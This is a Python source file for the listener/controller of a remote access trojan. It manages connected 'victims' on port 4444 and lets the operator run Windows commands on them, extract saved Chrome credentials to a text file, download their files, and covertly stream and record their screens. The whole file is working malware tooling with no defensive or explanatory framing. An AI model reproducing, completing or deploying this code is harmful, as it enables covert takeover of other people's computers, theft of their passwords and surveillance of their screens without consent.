import socket
import os
import json
import readline
import time
import threading
import base64
import cv2 #pip3 install opencv-python
from subprocess import Popen, DEVNULL, STDOUT
from termcolor import colored


class Victim:
	
	def __init__(self, target, ip):        
		self.target = target
		self.ip = ip
		
	def get_target(self):
		return self.target

	def get_ip(self):
		return self.ip

	def usage(self):
		print(colored("""
|═════════════════════════════|USAGE|═════════════════════════════|
*			:execute in windows command prompt
-chromepass  		:try to get credentials from Chrome
-d <filename>  		:download a file. e.g.: -d My files.zip
-h  			:print usage
-stream  		:stream the victims screan
-stop_stream  		:stop streaming the screen
-video 			:make a video from streamed screen
Ctr+C  			:pause connection
|═════════════════════════════════════════════════════════════════|""",'white',attrs=['bold']))

	def javascript_stream(self):
		script = '''<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>screenstream</title>
<script language="javascript">
function updateStatus(msg) {
  var status = document.getElementById("status");
  status.innerText = msg;
}

function noImage() {
  document.getElementById("streamer").style = "display:none";
  updateStatus("Waiting");
}

var i = 0;
function updateFrame() {
  var img = document.getElementById("streamer");
  img.src = "''' + str(self.ip[0]) +'''.jpeg#" + i;
  img.style = "display:";
  updateStatus("Playing");
  i++;
}

setInterval(function() {
  updateFrame();
},300);

</script>
</head>
<body>
<noscript>
  <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
</noscript>
<pre>
Status     : <span id="status"></span>
</pre>
<br>
<img onerror="noImage()" id="streamer">
<br><br>
</body>
</html>
		'''
		with open('/root/screen_stream_from_{}.html'.format(str(self.ip[0])), 'w') as f:
			f.write(script)

	def recv_file(self):
		received = self.json_recv()
		print('Receiving', received.split(SEPARATOR)[0],
		      '| Filesize:', round(int(received.split(SEPARATOR)[1])*0.0000009537, 2),"MB")
		with open(received.split(SEPARATOR)[0],'wb') as f:
			f.write(base64.b64decode(self.json_recv(52428800)))
			f.close()
			print('File Recieved!')

	def json_send(self,data):
		multiplier = 1;
		json_data = base64.b64encode(json.dumps(data).encode('utf-8'))[:BUFFER_SIZE]
		self.target.send(json_data)
		while json_data:
			json_data = base64.b64encode(json.dumps(data).encode('utf-8'))[multiplier*BUFFER_SIZE:(multiplier+1)*BUFFER_SIZE]
			self.target.send(json_data)
			multiplier += 1

	def json_recv(self, buff = 1024, protocol = "tcp"):
		data = b''
		while True:
			try:
				if protocol == "tcp":
					data = data + base64.b64decode(self.target.recv(buff))
				else: #udp
					data = data + base64.b64decode(self.udp_s.recvfrom(buff)[0])
				return json.loads(data)
			except ValueError:
				continue

	def make_video(self):
		video_name = '/root/screen_stream_from_{}.avi'.format(str(self.ip[0]))
		if os.path.isfile(video_name):
			os.system('rm {}'.format(video_name))
		path = '/root/screen_stream_from_{}/'.format(str(self.ip[0]))
		images = [path + img for img in os.listdir(path) if img.endswith(".jpeg")]
		frame = cv2.imread(images[0])
		images.sort()
		height, width, _ = frame.shape
		video = cv2.VideoWriter(video_name, 0, 2, (width,height))
		for image in images:
		    video.write(cv2.imread(image))
		video.release()

	def start_stream(self):
		self.udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.udp_s.bind((loc_ip,port+1))
		self.udp_s.settimeout(3)

		# read directory
		index = 1
		directory = '/root/screen_stream_from_{}'.format(str(self.ip[0]))
		if os.path.isdir(directory):
			index = len([name for name in os.listdir(directory) if name.endswith(".jpeg")])
		else:
			os.mkdir(directory)
		# start stream loop
		self.javascript_stream()
		firefox_stream = "gnome-terminal -e 'firefox /root/screen_stream_from_{}.html' --geometry 1x1+5000+5000".format(str(self.ip[0]))
		Popen(firefox_stream, stdout=DEVNULL, stderr=STDOUT ,shell=True)
		while not self.disconected:
			try:
				frame = self.json_recv(BUFFER_SIZE, "udp")
				b64dec_img = base64.b64decode(frame)
				name = "/root/screen_stream_from_{}/".format(str(self.ip[0]))+"{}.jpeg".format(index)
				current = "/root/{}.jpeg".format(str(self.ip[0]))
				with open (name, 'wb') as im:
					im.write(b64dec_img)
				with open (current, 'wb') as im:
					im.write(b64dec_img)
				index += 1
			except socket.timeout:
				if self.forced_disconection:
					print("-stop_stream")
					print("UDP socket timeout... ")
				else:
					print("UDP socket timeout...")
				break
		os.system("rm /root/{}.jpeg".format(str(self.ip[0])))
		# close and delete socket
		try:
			self.udp_s.close()
			del self.udp_s
			print("UDP streaming socket closed...")
		except:
			pass
		self.streaming_thread_on = False
		if self.forced_disconection:
			print("Threads joined... Press ENTER")
		else:
			print("Threads joined...")

	def join_threads(self):
		self.streaming_thread.join()

	def force_disconnect(self):
		self.forced_disconection = True
		self.disconected = True

	def cmd(self):
		self.disconected = False
		self.forced_disconection = False
		self.json_send(True)
		V_IP = colored(str(self.ip[0]),'cyan',attrs=['bold'])
		V_Port = colored(str(self.ip[1]),'magenta')
		init = self.json_recv()
		whoami = colored(init[0],'green',attrs=['bold'])
		wd = init[1]
		self.usage()
		streaming = False
		self.streaming_thread_on = False
		while not self.disconected:
			try:
				command = input("\n╔|IP: "+V_IP+" |Port: "+V_Port+" |Name: "+whoami+"╚═>§ "+wd+">")
				if command == "":
					continue

				elif command == '-h':
					self.usage()
					continue

				elif command == "-video":
					if os.path.exists('/root/screen_stream_from_{}/'.format(str(self.ip[0]))):
						try:
							self.make_video()
							print("Video written...")
						except Exception as e:
							print("Writing video failed! Reason: ", e)
					else:
						print("No images!")
					continue

				if not self.disconected: self.json_send(command)
				else: break

				if command == "-stream":
					if not self.streaming_thread_on and not streaming:
						self.streaming_thread = threading.Thread(target=self.start_stream)
						self.streaming_thread.start()
						print("UDP streaming thread started...")
						self.streaming_thread_on = True
						streaming = True
					elif self.streaming_thread_on and not streaming:
						print("Starting screen streaming...")
						streaming = True
					elif self.streaming_thread_on and streaming:
						print("Already streaming!")
					continue

				elif command == "-stop_stream":
					if self.streaming_thread_on and streaming:
						streaming = False
						self.join_threads()
					elif self.streaming_thread_on and not streaming:
						print("Not streaming!")
					elif not self.streaming_thread_on:
						print("UDP streaming thread not on!")
					continue

				if command[:3] == "cd " and len(command)>3:
					if self.json_recv():
						wd = self.json_recv()
						continue
					else:
						print("The system cannot find the path specified.")
						wd = self.json_recv()
						continue

				elif command[:3] == "-d " and len(command)>3:
					if self.json_recv():
						self.recv_file()
					else:
						print('No such file...')
					continue

				if not self.disconected: result = self.json_recv()
				else: break

				if command == "-chromepass":
					file = "Chormepass_from_{}.txt".format(str(self.ip[0]))
					with open(file,'w') as f:
						f.write(whoami+"\n\n")
						f.write(str(result))
						f.close()
						print("Credentials saved to {}".format(file))
						continue

				if not self.disconected: print(result)
				else: break

			except KeyboardInterrupt:
					pause = "PausepppPAUSE1234"
					self.json_send(pause)
					print(" Pausing conection...")
					break

		if self.forced_disconection:
			raise ConnectionError

		time.sleep(1.1)
		if streaming:
			self.join_threads()
			streaming = False
			

#x = input("Local IP = 192.168.1.1")
loc_ip = ''
#loc_ip = '192.168.1.1' + str(x)
port = 4444
BUFFER_SIZE = 1024
SEPARATOR = "<SEPARATOR>"
stop_threads = False
IP_LIST = []
TARGET_LIST = []

def banner():
	os.system("clear")
	print(colored("""     █████▒ ██████▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ███▄ ▄███▓
   ▓██   ▒▒██    ▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒
   ▒████ ░░ ▓██▄    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██    ▓██░
   ░▓█▒  ░  ▒   ██▒ ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██ 
   ░▒█░   ▒██████▒▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██▒   ░██▒
    ▒ ░   ▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░
    ░     ░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░░  ░      ░
    ░ ░   ░  ░  ░  ▒ ▒ ░░  ░  ░  ░    ░         ░   ░      ░   
                ░  ░ ░           ░              ░  ░       ░   
                   ░ ░                                      
        	      ██▀███   ▄▄▄     ▄▄▄█████▓
         	     ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒
         	     ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░
         	     ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░
         	     ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░
         	     ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░
         	       ░▒ ░ ▒░  ▒   ▒▒ ░   ░
         	       ░░   ░   ░   ▒    ░
         	        ░           ░  ░""",'red'))


def help():
	print(colored("""
|═════════════════════════════|USAGE|═════════════════════════════|
-c			:Clear screen, show banner and usage	
-h  			:Print usage			
-l			:Open listening window
-s X	  		:Select victim. e.g.: -s 0	
Ctr+C  			:Close server
|═════════════════════════════════════════════════════════════════|""",'white',attrs=['bold']))

def accept_connections():
	while True:
		s.settimeout(1)
		if stop_threads:
			break
		try:
			target, ip = s.accept()
			tgt = Victim(target, ip)
			TARGET_LIST.append(tgt)
			IP_LIST.append(tgt.get_ip())
			with open("/root/Folder/RAT/.IPs",'a') as f0:
				f0.write(str(tgt.get_ip()[0]+SEPARATOR+str(tgt.get_ip()[1])+"\n"))
			with open("/root/Folder/RAT/.log",'a') as f1:
				f1.write("Connection established from: "+str(tgt.get_ip()[0])+"\n")
		except: pass

def check_connection():
	while True:
		time.sleep(1)
		if stop_threads:
			break
		try:
			for target in TARGET_LIST:
				check = len(str(target.get_target()).split())
				if check != 9:
					target.force_disconnect()
					TARGET_LIST.remove(target)
					IP_LIST.remove(target.get_ip())
					with open("/root/Folder/RAT/.IPs",'w') as f0:
						for tgt in TARGET_LIST:
							f0.write(str(tgt.get_ip()[0]+SEPARATOR+str(tgt.get_ip()[1])+"\n"))
					with open("/root/Folder/RAT/.log",'a') as f1:
						f1.write("Connection lost from: "+str(target.get_ip()[0])+"\n")
		except: continue

def close_server():
	global stop_threads
	stop_threads = True
	stopconn = False
	with open("/root/Folder/RAT/.log",'a') as write_close:
		write_close.write("Server closed...")
	IPs_file.close()
	log_file.close()
	os.remove("/root/Folder/RAT/.IPs")
	print("Closing listener...\n")
	for tgt in TARGET_LIST:
		try:
			tgt.json_send(stopconn)
		except: continue
	accept_connections_thread.join()
	check_connection_thread.join()
	s.close()
	exit()

def list_window():
	list_term = "gnome-terminal -e 'python3 /root/Folder/RAT/list_victims.py' --geometry 65x17+0+0"
	Popen(list_term, stdout=DEVNULL, stderr=STDOUT ,shell=True)

def start_server():
	global s
	global IPs_file
	global log_file
	global accept_connections_thread
	global check_connection_thread
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((loc_ip,port))
	s.listen(100)

	accept_connections_thread = threading.Thread(target=accept_connections)
	check_connection_thread = threading.Thread(target=check_connection)
	accept_connections_thread.start()
	check_connection_thread.start()

	IPs_file = open("/root/Folder/RAT/.IPs",'w')
	log_file = open("/root/Folder/RAT/.log","w")
	list_window()
	while True:
		try:
			fsyst = input("\n["+colored("F$Y$T3M",'red',attrs=['bold'])+"]══>§: ")
			if fsyst == "-c":
				banner()
				help()
			elif fsyst == "-l":
				list_window()
			elif fsyst == "-h":
				help()
			elif fsyst[:3] == "-s ":
				try:
					selection = int(fsyst[3:])
					target = TARGET_LIST[selection]
					target.cmd()	
				except ConnectionError:
					try:target.join_threads()
					except:pass
					print(colored("Victim disconnected...", 'red',attrs=['bold']))
				except:
					print("Invalid selection...")
			elif fsyst == "":
				continue
			else:
				print("Invalid option...")

		except KeyboardInterrupt:
			close_server()
			break
	
banner()
help()
start_server()